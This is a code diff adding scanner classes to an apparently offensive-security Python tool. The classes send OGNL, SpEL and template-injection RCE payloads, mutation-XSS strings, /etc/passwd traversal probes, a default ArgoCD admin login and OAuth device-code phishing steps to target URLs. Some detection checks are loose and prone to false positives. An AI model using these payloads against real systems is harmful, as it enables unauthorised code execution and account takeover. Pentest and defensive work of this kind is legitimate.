@@ -9703,6 +9703,1757 @@ class AttackSurfaceScorecard:
         return profile
 
 # ══════════════════════════════════════════════════════════════
+# TOOLS 211-270 — 60 Red/Black Team Skills (Phase 13)
+# ══════════════════════════════════════════════════════════════
+
+class OGNLInjectionScanner:
+    """Detect OGNL/EL injection in Apache Struts2, Spring, JSP — CVE-2017-5638 family."""
+    NAME = "OGNL Injection Scanner"
+    OGNL_PAYLOADS = [
+        ("%{7*7}",                  "49",    "OGNL basic arithmetic"),
+        ("${7*7}",                  "49",    "EL basic arithmetic"),
+        ("#{7*7}",                  "49",    "JSP EL arithmetic"),
+        ("%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new+java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
+                                    "uid=",  "Struts2 S2-045 RCE"),
+        ("T(java.lang.Runtime).getRuntime().exec('id')", "uid=", "Spring SpEL RCE"),
+        ("${Runtime.exec('id')}",   "uid=",  "JSP EL exec"),
+        ("%{class.classLoader.URLs[0]}", "file:", "OGNL classLoader leak"),
+    ]
+    OGNL_PARAMS = ["name", "username", "search", "q", "query", "action",
+                   "redirect", "next", "target", "data", "value", "field",
+                   "message", "comment", "title", "description", "text"]
+    OGNL_HEADERS = ["Content-Type", "Accept", "X-Forwarded-For",
+                    "User-Agent", "Referer", "X-Custom-Header"]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        import urllib.parse
+        base = profile.url.rstrip("/")
+        for payload, expected, label in self.OGNL_PAYLOADS[:4]:
+            enc = urllib.parse.quote(payload)
+            # Test via query param
+            for param in self.OGNL_PARAMS[:6]:
+                url = f"{base}/?{param}={enc}"
+                try:
+                    r = _fetch(url, cfg.ua, cfg.timeout)
+                    if r and r.status in (200, 400, 500):
+                        body = (r.body or b"").decode("utf-8", errors="replace")
+                        if expected in body or "49" in body:
+                            profile.findings.append(Finding(
+                                id=f"OGNL-{label.replace(' ','_').upper()[:16]}-{param.upper()[:8]}",
+                                title=f"OGNL/EL Injection — {label} via ?{param}",
+                                severity="CRITICAL",
+                                cvss=10.0,
+                                cwe="CWE-917",
+                                description=(
+                                    f"OGNL/Expression Language injection via parameter '{param}'. "
+                                    f"Payload '{payload[:60]}' returned expected output '{expected}'. "
+                                    "Enables full RCE on server — Struts2/Spring framework exploitation."
+                                ),
+                                evidence=f"Param: {param} | Expected: {expected} | Found in response: True",
+                                poc_curl=(
+                                    f"curl -sk '{url}'\n"
+                                    f"# Struts2 Content-Type RCE (S2-045):\n"
+                                    f"curl -sk -X POST '{base}/' "
+                                    f"-H \"Content-Type: %{{(#cmd='id').(#cmds={{'/bin/bash','-c',#cmd}})."
+                                    f"(#p=new java.lang.ProcessBuilder(#cmds)).(#p.start()).text}}\""
+                                ),
+                                category="OGNL / EL Injection",
+                                remediation="Upgrade Struts2 to ≥2.5.33 / ≥6.x. Disable dynamic method invocation. Apply OGNL expression sandbox. Use CSP for Spring EL contexts."
+                            ))
+                            break
+                except Exception:
+                    pass
+            # Test via Content-Type header (S2-045 style)
+            for path in ["/", "/index.action", "/login.action", "/search.action"]:
+                url = f"{base}{path}"
+                try:
+                    r = _fetch(url, cfg.ua, cfg.timeout, "POST", b"x=1",
+                               {"Content-Type": payload})
+                    if r and r.status in (200, 400, 500):
+                        body = (r.body or b"").decode("utf-8", errors="replace")
+                        if expected in body:
+                            profile.findings.append(Finding(
+                                id=f"OGNL-CTYPE-{label.replace(' ','_').upper()[:16]}",
+                                title=f"Struts2 Content-Type OGNL Injection — {label}",
+                                severity="CRITICAL",
+                                cvss=10.0,
+                                cwe="CWE-917",
+                                description=(
+                                    f"Struts2 S2-045 style OGNL injection via Content-Type header at {path}. "
+                                    f"Expected output '{expected}' found in response."
+                                ),
+                                evidence=body[:200],
+                                poc_curl=(
+                                    f"curl -sk -X POST '{url}' "
+                                    f"-H 'Content-Type: {payload[:80]}...'"
+                                ),
+                                category="OGNL / EL Injection",
+                                remediation="Upgrade Apache Struts2 immediately. Apply CVE-2017-5638 patch. Implement WAF rule for OGNL patterns in Content-Type header."
+                            ))
+                            break
+                except Exception:
+                    pass
+        return profile
+
+
+class ELInjectionScanner:
+    """Detect Java Expression Language injection (Spring SpEL, JSP EL, Thymeleaf)."""
+    NAME = "EL Injection Scanner"
+    EL_PAYLOADS = [
+        ("${7*7}",                                  "49",   "Basic EL"),
+        ("#{7*7}",                                  "49",   "JSP EL"),
+        ("*{7*7}",                                  "49",   "Thymeleaf SpEL"),
+        ("[[${7*7}]]",                              "49",   "Thymeleaf inline"),
+        ("${T(java.lang.System).getenv()}",         "PATH", "Spring SpEL env"),
+        ("${applicationContext}",               "org.spring", "Spring context leak"),
+        ("${#httpServletRequest.class}",        "class ",     "Thymeleaf request class"),
+        ("@{T(java.lang.Runtime).getRuntime()}", "java.lang", "Spring SpEL runtime"),
+    ]
+    EL_PARAMS = ["name", "template", "message", "subject", "body", "email",
+                 "text", "title", "content", "value", "q", "search", "page",
+                 "lang", "locale", "theme", "view"]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        import urllib.parse
+        base = profile.url.rstrip("/")
+        for payload, expected, label in self.EL_PAYLOADS:
+            enc = urllib.parse.quote(payload)
+            for param in self.EL_PARAMS[:8]:
+                url = f"{base}/?{param}={enc}"
+                try:
+                    r = _fetch(url, cfg.ua, cfg.timeout)
+                    if r and r.status in (200, 400, 500):
+                        body = (r.body or b"").decode("utf-8", errors="replace")
+                        if expected in body and payload not in body:
+                            profile.findings.append(Finding(
+                                id=f"EL-INJECT-{label.replace(' ','_').upper()[:16]}-{param.upper()[:6]}",
+                                title=f"EL Injection — {label} via ?{param}",
+                                severity="CRITICAL",
+                                cvss=9.8,
+                                cwe="CWE-917",
+                                description=(
+                                    f"Expression Language injection via '{param}': payload '{payload}' "
+                                    f"evaluated to '{expected}'. Enables server-side code execution "
+                                    "in Spring/Thymeleaf/JSP context."
+                                ),
+                                evidence=f"Payload: {payload} → Response contains: {expected}",
+                                poc_curl=(
+                                    f"curl -sk '{url}'\n"
+                                    f"# RCE via Spring SpEL:\n"
+                                    f"curl -sk '{base}/?{param}="
+                                    + urllib.parse.quote(
+                                        "${T(java.lang.Runtime).getRuntime().exec('id')}")
+                                    + "'"
+                                ),
+                                category="EL / SpEL Injection",
+                                remediation="Sanitise all user input before passing to template engines. Use safe Thymeleaf context (th:text not th:utext). Disable SpEL evaluation on untrusted input. Use Spring Security expression handler restrictions."
+                            ))
+                            break
+                except Exception:
+                    pass
+        return profile
+
+
+class VelocityFreeMarkerSSTI:
+    """Detect Velocity, FreeMarker, Pebble, and Smarty SSTI patterns."""
+    NAME = "Velocity/FreeMarker SSTI"
+    SSTI_PAYLOADS = [
+        # (payload, expected_output, engine)
+        ("#set($x=7*7)${x}",              "49",    "Velocity"),
+        ("#set($e='exp');$e.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke($e.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')",
+                                           "java",  "Velocity RCE"),
+        ("<#assign x=7*7>${x}",            "49",    "FreeMarker"),
+        ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
+                                           "uid=",  "FreeMarker RCE"),
+        ("{{7*7}}",                        "49",    "Jinja2/Twig"),
+        ("{7*7}",                          "49",    "Smarty"),
+        ("{php}echo 7*7;{/php}",           "49",    "Smarty PHP"),
+        ("{% 7*7 %}",                     "49",    "Pebble"),
+        ("{{ ''.__class__.__mro__[2].__subclasses__() }}", "object", "Jinja2 subclasses"),
+        ("{$smarty.version}",              "Smarty","Smarty version leak"),
+    ]
+    SSTI_PARAMS = ["template", "name", "subject", "body", "message", "text",
+                   "content", "title", "lang", "locale", "page", "view",
+                   "layout", "theme", "format", "render", "tpl"]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        import urllib.parse
+        base = profile.url.rstrip("/")
+        for payload, expected, engine in self.SSTI_PAYLOADS:
+            enc = urllib.parse.quote(payload)
+            for param in self.SSTI_PARAMS[:6]:
+                url = f"{base}/?{param}={enc}"
+                try:
+                    r = _fetch(url, cfg.ua, cfg.timeout)
+                    if r and r.status in (200, 500):
+                        body = (r.body or b"").decode("utf-8", errors="replace")
+                        if expected in body and payload.replace(urllib.parse.quote(payload), "") not in body:
+                            profile.findings.append(Finding(
+                                id=f"SSTI-{engine.replace('/','_').replace(' ','_').upper()[:12]}-{param.upper()[:8]}",
+                                title=f"SSTI {engine} via ?{param}",
+                                severity="CRITICAL",
+                                cvss=9.8,
+                                cwe="CWE-1336",
+                                description=(
+                                    f"{engine} SSTI detected via parameter '{param}'. "
+                                    f"Payload '{payload[:60]}' evaluated: expected '{expected}' found in response. "
+                                    f"Enables server-side code execution."
+                                ),
+                                evidence=f"Engine: {engine} | Expected: {expected} | Confirmed: True",
+                                poc_curl=f"curl -sk '{url}'",
+                                category="SSTI",
+                                remediation=f"Sanitise all user input before passing to {engine} templates. Use sandboxed template execution. Disable dangerous built-ins. Apply allowlist on template variable names."
+                            ))
+                            break
+                except Exception:
+                    pass
+        return profile
+
+
+class OAuth2DeviceCodeAbuse:
+    """Detect OAuth2 device authorization flow misconfigurations enabling phishing."""
+    NAME = "OAuth2 Device Code Abuse"
+    DEVICE_PATHS = [
+        "/oauth/device/code", "/oauth2/device/code", "/oauth/device_authorization",
+        "/connect/deviceauthorization", "/v2/device/code",
+        "/.well-known/openid-configuration", "/oauth2/.well-known/openid-configuration",
+        "/oauth/authorize", "/oauth2/authorize", "/auth/oauth2/authorize",
+        "/realms/master/protocol/openid-connect/auth/device",
+        "/oauth2/default/v1/device/authorize",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path in self.DEVICE_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status in (200, 400, 405):
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    if any(sig in body for sig in [
+                        "device_code", "user_code", "verification_uri",
+                        "device_authorization_endpoint", "token_endpoint",
+                        "grant_types_supported", "response_types_supported",
+                        '"device_authorization"', "openid-configuration"
+                    ]):
+                        is_device_flow = "device_code" in body or "device_authorization" in body
+                        profile.findings.append(Finding(
+                            id=f"OAUTH2-DEVICE-{path.replace('/','_').strip('_')[:18].upper()}",
+                            title=f"OAuth2 {'Device Flow' if is_device_flow else 'Authorization'} Endpoint: {path}",
+                            severity="HIGH" if is_device_flow else "MEDIUM",
+                            cvss=7.1 if is_device_flow else 5.3,
+                            cwe="CWE-287",
+                            description=(
+                                f"OAuth2 {'device authorization flow' if is_device_flow else 'endpoint'} "
+                                f"detected at {path}. "
+                                + ("Device flow enables real-time phishing: attacker generates device_code, "
+                                   "tricks victim into entering user_code, attacker polls for access token. "
+                                   "No interaction with victim's device required."
+                                   if is_device_flow else
+                                   "OAuth2 endpoint enumerated — review for implicit flow, PKCE, and state parameter enforcement.")
+                            ),
+                            evidence=body[:300],
+                            poc_curl=(
+                                f"# Step 1 — Request device code:\n"
+                                f"curl -sk -X POST '{url}' -d 'client_id=CLIENT_ID&scope=openid email profile'\n"
+                                f"# Step 2 — Show user_code to victim, poll for token:\n"
+                                f"curl -sk -X POST TOKEN_ENDPOINT "
+                                f"-d 'grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=DEVICE_CODE&client_id=CLIENT_ID'"
+                            ),
+                            category="OAuth2 / OIDC",
+                            remediation="Implement short device code expiry (≤15 min). Require re-authentication on device flow. Display trusted app name to user. Implement rate-limiting on polling. Block device flow for sensitive scopes."
+                        ))
+            except Exception:
+                pass
+        return profile
+
+
+class AzureADMisconfigDetector:
+    """Detect Azure AD token endpoint misconfigs, implicit flow, and consent phishing surface."""
+    NAME = "Azure AD Misconfig Detector"
+    AAD_PATHS = [
+        "/oauth2/v2.0/token", "/oauth2/token",
+        "/oauth2/v2.0/authorize", "/oauth2/authorize",
+        "/.well-known/openid-configuration",
+        "/oauth2/v2.0/.well-known/openid-configuration",
+        "/.well-known/microsoft-identity-platform-endpoint-discovery",
+        "/adminconsent", "/oauth2/v2.0/adminconsent",
+        "/sync/provisioning/exportChanges",
+        "/graph/v1.0/me", "/graph/v1.0/users",
+        "/api/token", "/api/auth/token",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path in self.AAD_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status in (200, 400, 401):
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    if any(sig in body for sig in [
+                        "tenant", "client_id", "authorization_endpoint",
+                        "token_endpoint", "microsoft.com", "login.microsoftonline",
+                        "id_token_signing_alg", "access_token",
+                        "error_description", "AADSTS", "Bearer",
+                        "microsoftonline.com", "azure.com",
+                    ]):
+                        has_implicit = "token" in body and "implicit" in body.lower()
+                        profile.findings.append(Finding(
+                            id=f"AAD-{path.replace('/','_').strip('_')[:18].upper()}",
+                            title=f"Azure AD {'Implicit Flow' if has_implicit else 'Endpoint'} Exposed: {path}",
+                            severity="HIGH" if has_implicit else "MEDIUM",
+                            cvss=7.1 if has_implicit else 5.3,
+                            cwe="CWE-287",
+                            description=(
+                                f"Azure AD authentication endpoint at {path}. "
+                                + ("Implicit flow enabled — access tokens returned in URL fragment, "
+                                   "vulnerable to token leakage via Referer header and browser history. "
+                                   if has_implicit else
+                                   "Azure AD endpoint discovered — enumerate for tenant ID, client configuration, and consent phishing.")
+                            ),
+                            evidence=body[:300],
+                            poc_curl=(
+                                f"curl -sk '{url}'\n"
+                                f"# Enumerate tenant:\n"
+                                f"curl -sk 'https://login.microsoftonline.com/{profile.apex}/.well-known/openid-configuration'"
+                            ),
+                            category="Azure AD / OAuth2",
+                            remediation="Disable implicit flow. Use PKCE with authorization code flow. Implement admin consent workflow. Restrict redirect URIs. Monitor for suspicious consent grants."
+                        ))
+            except Exception:
+                pass
+        return profile
+
+
+class AWSS3PresignedAbuse:
+    """Detect S3 presigned URL abuse, public bucket policy, and cross-account issues."""
+    NAME = "AWS S3 Presigned URL Abuse"
+    S3_ENDPOINTS = [
+        "/api/upload", "/api/presign", "/api/s3/presign",
+        "/api/v1/upload", "/api/v2/upload", "/upload/presign",
+        "/files/presign", "/media/presign", "/storage/presign",
+        "/api/attachment/upload", "/api/documents/upload",
+        "/api/avatar/upload", "/api/profile/photo",
+        "/api/export", "/api/download", "/api/files",
+    ]
+    S3_BUCKET_PATTERNS = [
+        "X-Amz-Signature", "AWSAccessKeyId", "x-amz-credential",
+        "X-Amz-Security-Token", "amazonaws.com", "s3.amazonaws.com",
+        "x-amz-date", "x-amz-algorithm", "presigned",
+        "Content-Disposition: attachment", "X-Amz-Expires",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path in self.S3_ENDPOINTS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status in (200, 201, 400, 401, 403):
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    hdrs = str(r.headers)
+                    combined = body + hdrs
+                    hits = [p for p in self.S3_BUCKET_PATTERNS if p.lower() in combined.lower()]
+                    if hits:
+                        profile.findings.append(Finding(
+                            id=f"S3-PRESIGN-{path.replace('/','_').strip('_')[:18].upper()}",
+                            title=f"S3 Presigned URL / AWS Storage Endpoint: {path}",
+                            severity="HIGH",
+                            cvss=7.5,
+                            cwe="CWE-639",
+                            description=(
+                                f"AWS S3 presigned URL or storage endpoint at {path}. "
+                                f"Signatures found: {', '.join(hits[:4])}. "
+                                "Presigned URL abuse: enumerate bucket name, test for public listing, "
+                                "check ACL for world-readable/writable, attempt cross-account access."
+                            ),
+                            evidence=f"Indicators: {hits} | Response snippet: {body[:200]}",
+                            poc_curl=(
+                                f"curl -sk '{url}'\n"
+                                f"# Test bucket listing (replace BUCKET-NAME):\n"
+                                f"curl -sk 'https://BUCKET-NAME.s3.amazonaws.com/?list-type=2'\n"
+                                f"# Check bucket ACL:\n"
+                                f"aws s3api get-bucket-acl --bucket BUCKET-NAME"
+                            ),
+                            category="Cloud Storage",
+                            remediation="Block public S3 access at account level (Block Public Access). Apply bucket policies with explicit Deny for * principal. Use short-lived presigned URLs (≤15 min). Log and alert on GetBucketAcl API calls."
+                        ))
+            except Exception:
+                pass
+        return profile
+
+
+class NginxMisconfigDetector:
+    """Detect Nginx off-by-slash, alias traversal, status page, and merge_slashes bypass."""
+    NAME = "Nginx Misconfig Detector"
+    NGINX_PROBES = [
+        # (path, description, indicators)
+        ("/nginx_status",     "Nginx status module exposed",
+         ["Active connections:", "server accepts", "Reading:", "Writing:", "Waiting:"]),
+        ("/stub_status",      "Nginx stub_status exposed",
+         ["Active connections:", "server accepts handled"]),
+        ("/.git/..%2f..%2fnginx_status", "Nginx alias traversal via encoded slashes",
+         ["Active connections:", "accepts"]),
+        ("/api../admin",      "Nginx off-by-slash alias bypass",
+         ["admin", "dashboard", "management"]),
+        ("/static..//etc/passwd", "Nginx alias path traversal",
+         ["root:", "bin/bash"]),
+        ("/%2e%2e/etc/passwd","Nginx URL normalization bypass — LFI",
+         ["root:", "bin/bash"]),
+        ("//etc/passwd",      "Nginx double-slash normalization bypass",
+         ["root:", "bin/bash"]),
+        ("/api/v1/..%2finternal", "Nginx merge_slashes=off path confusion",
+         ["internal", "admin", "private"]),
+        ("/app/../../../etc/passwd", "Nginx path traversal",
+         ["root:", "bin/bash"]),
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path, desc, indicators in self.NGINX_PROBES:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status in (200, 206):
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    hits = [ind for ind in indicators if ind.lower() in body.lower()]
+                    if hits:
+                        is_critical = "passwd" in path or "traversal" in desc.lower()
+                        profile.findings.append(Finding(
+                            id=f"NGINX-{path.replace('/','_').replace('%','').strip('_')[:18].upper()}",
+                            title=f"Nginx Misconfiguration: {desc}",
+                            severity="CRITICAL" if is_critical else "HIGH",
+                            cvss=9.1 if is_critical else 7.5,
+                            cwe="CWE-22" if is_critical else "CWE-200",
+                            description=(
+                                f"Nginx misconfiguration at {path}: {desc}. "
+                                f"Expected indicators found: {', '.join(hits[:3])}."
+                            ),
+                            evidence=body[:300],
+                            poc_curl=f"curl -sk '{url}'",
+                            category="Nginx Misconfig",
+                            remediation=(
+                                "Fix Nginx alias configuration (ensure trailing slash consistency). "
+                                "Disable nginx_status/stub_status for public access. "
+                                "Set merge_slashes on. Apply URL normalisation. "
+                                "Block ../ patterns in WAF. Review all alias directives."
+                            )
+                        ))
+            except Exception:
+                pass
+        return profile
+
+
+class TraefikDashboardDetector:
+    """Detect exposed Traefik reverse proxy dashboard and route enumeration."""
+    NAME = "Traefik Dashboard Detector"
+    TRAEFIK_PATHS = [
+        "/dashboard/", "/dashboard/#/", "/api/rawdata",
+        "/api/http/routers", "/api/http/services", "/api/http/middlewares",
+        "/api/tcp/routers", "/api/tcp/services",
+        "/api/entrypoints", "/api/overview",
+        "/api/version", "/api/providers",
+        "/metrics", "/ping", "/health",
+        "/api", "/api/",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path in self.TRAEFIK_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status == 200:
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    if any(sig in body for sig in [
+                        "traefik", "Traefik", "@router", "entryPoints",
+                        '"routers"', '"services"', '"middlewares"',
+                        '"providers"', "docker", "kubernetes",
+                        '"rule":', '"passHostHeader"', '"loadBalancer"',
+                        "RawData", "dashboard", "Jaeger"
+                    ]):
+                        sev = "CRITICAL" if "rawdata" in path or "routers" in path else "HIGH"
+                        profile.findings.append(Finding(
+                            id=f"TRAEFIK-{path.replace('/','_').strip('_')[:18].upper()}",
+                            title=f"Traefik {'API/Rawdata' if 'api' in path else 'Dashboard'} Exposed: {path}",
+                            severity=sev,
+                            cvss=9.1 if sev == "CRITICAL" else 7.5,
+                            cwe="CWE-284",
+                            description=(
+                                f"Traefik reverse proxy {path} exposed. "
+                                "Reveals all internal service routes, Docker/K8s service names, "
+                                "backend IPs, middleware configs, TLS settings, and internal network topology."
+                            ),
+                            evidence=body[:300],
+                            poc_curl=(
+                                f"curl -sk '{url}'\n"
+                                f"# Dump all HTTP routers:\n"
+                                f"curl -sk '{base}/api/http/routers' | python3 -m json.tool\n"
+                                f"# Get all service backends:\n"
+                                f"curl -sk '{base}/api/http/services' | python3 -m json.tool"
+                            ),
+                            category="Reverse Proxy / Infra",
+                            remediation="Disable Traefik API/dashboard on public interfaces. Add authentication middleware (BasicAuth or Forward Auth). Bind dashboard to internal network only. Use --api.insecure=false."
+                        ))
+                        break
+            except Exception:
+                pass
+        return profile
+
+
+class ArgoCDExposedDetector:
+    """Detect exposed ArgoCD API server, JWT token theft, and admin access."""
+    NAME = "ArgoCD Exposed Detector"
+    ARGOCD_PATHS = [
+        "/api/v1/applications",
+        "/api/v1/clusters",
+        "/api/v1/repositories",
+        "/api/v1/projects",
+        "/api/v1/settings",
+        "/api/v1/account",
+        "/api/v1/session",
+        "/api/version",
+        "/auth/callback",
+        "/login",
+        "/api/v1/certificates",
+        "/api/v1/gpgkeys",
+        "/terminal",
+        "/api/v1/stream/applications",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path in self.ARGOCD_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status in (200, 401, 403):
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    if any(sig in body for sig in [
+                        "ArgoCD", "argocd", "argo-cd", "Argo CD",
+                        '"items"', '"metadata"', '"spec"', '"status"',
+                        '"cluster"', '"repo"', '"project"',
+                        "application-controller", '"token"',
+                        "argoproj.io", '"syncPolicy"',
+                    ]):
+                        sev = "CRITICAL" if r.status == 200 and any(
+                            s in body for s in ['"items"', '"cluster"', '"token"']
+                        ) else "HIGH"
+                        profile.findings.append(Finding(
+                            id=f"ARGOCD-{path.replace('/','_').strip('_')[:18].upper()}",
+                            title=f"ArgoCD {'API Data Exposed' if r.status==200 else 'Instance Detected'}: {path}",
+                            severity=sev,
+                            cvss=9.8 if sev == "CRITICAL" else 7.5,
+                            cwe="CWE-284",
+                            description=(
+                                f"ArgoCD GitOps deployment tool at {path} (HTTP {r.status}). "
+                                "ArgoCD has direct access to K8s clusters and Git repositories. "
+                                "Unauthenticated access → deploy malicious apps → full cluster compromise. "
+                                "API access → extract cluster secrets, Git credentials, SSH keys."
+                            ),
+                            evidence=body[:300],
+                            poc_curl=(
+                                f"curl -sk '{url}'\n"
+                                f"# Login with default admin:\n"
+                                f"curl -sk -X POST '{base}/api/v1/session' "
+                                f"-d '{{\"username\":\"admin\",\"password\":\"admin\"}}'\n"
+                                f"# List apps after auth:\n"
+                                f"curl -sk '{base}/api/v1/applications' "
+                                f"-H 'Authorization: Bearer TOKEN'"
+                            ),
+                            category="GitOps / CI-CD",
+                            remediation="Enable ArgoCD SSO. Rotate initial admin password. Restrict ArgoCD API to internal network. Enable RBAC. Audit all application sync policies. Apply network policies."
+                        ))
+            except Exception:
+                pass
+        return profile
+
+
+class DOMClobberingDetector:
+    """Detect DOM clobbering and mutation XSS (mXSS) attack surface in HTML responses."""
+    NAME = "DOM Clobbering Detector"
+    CLOBBER_PAYLOADS = [
+        ('<form id="x"><input id="y" name="z"></form>', "DOM clobbering form"),
+        ('<a id="x" href="javascript:void(0)"></a>', "Anchor DOM clobber"),
+        ('<img id="x" name="y">', "Image DOM clobber"),
+        ('<iframe id="x" name="y"></iframe>', "iFrame DOM clobber"),
+        ('<object id="x" name="y"></object>', "Object DOM clobber"),
+    ]
+    MUTATATION_XSS_PAYLOADS = [
+        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
+        '<listing><img src=x onerror=alert(1)></listing>',
+        '<xmp><script>alert(1)</script></xmp>',
+        '<textarea><script>alert(1)</script></textarea>',
+        '<title><script>alert(1)</script></title>',
+        '<style><script>alert(1)</script></style>',
+        '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
+        '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
+        '<details open ontoggle="alert(1)">',
+        '"><img src=x id=y name=z onerror="alert(document.domain)">',
+    ]
+    DOM_SINK_PATTERNS = [
+        "innerHTML", "outerHTML", "document.write", "insertAdjacentHTML",
+        "eval(", "setTimeout(", "setInterval(", "Function(",
+        "location.href", "location.hash", "location.search",
+        "window.name", "document.referrer", "document.URL",
+        "postMessage", "addEventListener.*message",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        import re, urllib.parse
+        base = profile.url.rstrip("/")
+        # Probe HTML pages for DOM sink patterns
+        try:
+            r = _fetch(base + "/", cfg.ua, cfg.timeout)
+            if r and r.status == 200:
+                body = (r.body or b"").decode("utf-8", errors="replace")
+                sinks = [s for s in self.DOM_SINK_PATTERNS if s in body]
+                if sinks:
+                    profile.findings.append(Finding(
+                        id="DOM-CLOBBER-SINK-001",
+                        title="DOM XSS Sinks Detected in Page Source",
+                        severity="HIGH",
+                        cvss=7.4,
+                        cwe="CWE-79",
+                        description=(
+                            f"DOM XSS sink functions found in page source: {', '.join(sinks[:6])}. "
+                            "These indicate potential DOM clobbering or mXSS when combined with "
+                            "user-controlled inputs (location.hash, window.name, postMessage)."
+                        ),
+                        evidence=f"Sinks: {sinks[:6]}\nSnippet: {body[:300]}",
+                        poc_curl=(
+                            f"# Test DOM clobbering:\n"
+                            f"# Open in browser: {base}/#<img id=x>\n"
+                            f"# mXSS test:\n"
+                            f"curl -sk '{base}/?q={urllib.parse.quote(self.MUTATATION_XSS_PAYLOADS[0][:50])}'"
+                        ),
+                        category="DOM XSS",
+                        remediation="Avoid innerHTML/outerHTML. Use textContent for user data. Implement DOMPurify for sanitisation. Apply CSP with script-src 'nonce-'. Audit all postMessage handlers."
+                    ))
+        except Exception:
+            pass
+        # Test mXSS via params
+        import urllib.parse
+        for payload in self.MUTATATION_XSS_PAYLOADS[:4]:
+            enc = urllib.parse.quote(payload)
+            for param in ["q", "search", "name", "msg"]:
+                url = f"{base}/?{param}={enc}"
+                try:
+                    r = _fetch(url, cfg.ua, cfg.timeout)
+                    if r and r.status == 200:
+                        body = (r.body or b"").decode("utf-8", errors="replace")
+                        if "onerror" in body.lower() or "ontoggle" in body.lower() or "onbegin" in body.lower():
+                            if "<script>" not in body.lower() or "alert" not in body.lower():
+                                profile.findings.append(Finding(
+                                    id=f"MXSS-MUTATE-{param.upper()[:8]}-{hash(payload) % 9999:04d}",
+                                    title=f"Mutation XSS (mXSS) Surface via ?{param}",
+                                    severity="HIGH",
+                                    cvss=7.4,
+                                    cwe="CWE-79",
+                                    description=(
+                                        f"Mutation XSS payload survived partial sanitisation via ?{param}. "
+                                        "Browser DOM mutation during innerHTML parsing may execute the payload "
+                                        "despite server-side filtering."
+                                    ),
+                                    evidence=f"Payload fragment in response: {body[:200]}",
+                                    poc_curl=f"curl -sk '{url}'",
+                                    category="DOM XSS",
+                                    remediation="Use DOMPurify with a strict configuration. Test sanitiser with mXSS test suite (cure53/mXSS-attacks). Apply CSP. Avoid innerHTML."
+                                ))
+                except Exception:
+                    pass
+        return profile
+
+
+class PaddingOracleDetector:
+    """Detect CBC padding oracle via response length and timing differentials."""
+    NAME = "Padding Oracle Detector"
+    PADDING_PARAMS = ["token", "session", "auth", "data", "payload",
+                      "enc", "encrypted", "cipher", "value", "iv", "key"]
+    PADDING_PATHS = ["/decrypt", "/verify", "/validate", "/auth", "/token",
+                     "/api/decrypt", "/api/verify", "/api/auth", "/api/validate"]
+    VALID_B64 = "dGVzdA=="         # base64("test")
+    TAMPERED = [
+        "dGVzdA==",
+        "dGVzdAA=",
+        "dGVzdAAAA==",
+        "AAAAAAAAAAAAAAAAAAAAAA==",
+        "ffffffffffffffffffffffffffffffff",
+        "0000000000000000ffffffffffffffff",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        import urllib.parse
+        base = profile.url.rstrip("/")
+        for path in self.PADDING_PATHS:
+            url = base + path
+            responses = []
+            for tok in self.TAMPERED:
+                enc = urllib.parse.quote(tok)
+                probe_url = f"{url}?token={enc}"
+                try:
+                    t0 = time.time()
+                    r = _fetch(probe_url, cfg.ua, cfg.timeout)
+                    elapsed = time.time() - t0
+                    if r:
+                        responses.append((r.status, len(r.body or b""), elapsed, tok))
+                except Exception:
+                    pass
+            if len(responses) >= 3:
+                statuses = set(s for s, _, _, _ in responses)
+                lengths  = set(l for _, l, _, _ in responses)
